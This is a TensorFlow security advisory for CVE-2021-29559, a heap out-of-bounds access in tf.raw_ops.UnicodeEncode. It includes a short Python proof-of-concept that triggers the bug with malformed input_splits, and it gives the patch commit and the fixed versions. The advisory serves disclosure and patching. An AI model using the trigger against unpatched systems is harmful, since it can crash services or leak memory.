## TFSA-2021-047: Heap OOB access in unicode ops

### CVE Number
CVE-2021-29559

### Impact
An attacker can access data outside of bounds of heap allocated array in
`tf.raw_ops.UnicodeEncode`:

```python
import tensorflow as tf

input_values = tf.constant([58], shape=[1], dtype=tf.int32)
input_splits = tf.constant([[81, 101, 0]], shape=[3], dtype=tf.int32)
output_encoding = "UTF-8"

tf.raw_ops.UnicodeEncode(
    input_values=input_values, input_splits=input_splits,
    output_encoding=output_encoding)
```

This is because the
[implementation](https://github.com/tensorflow/tensorflow/blob/472c1f12ad9063405737679d4f6bd43094e1d36d/tensorflow/core/kernels/unicode_ops.cc)
assumes that the `input_value`/`input_splits` pair specify a valid sparse
tensor.

### Patches
We have patched the issue in GitHub commit
[51300ba1cc2f487aefec6e6631fef03b0e08b298](https://github.com/tensorflow/tensorflow/commit/51300ba1cc2f487aefec6e6631fef03b0e08b298).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.
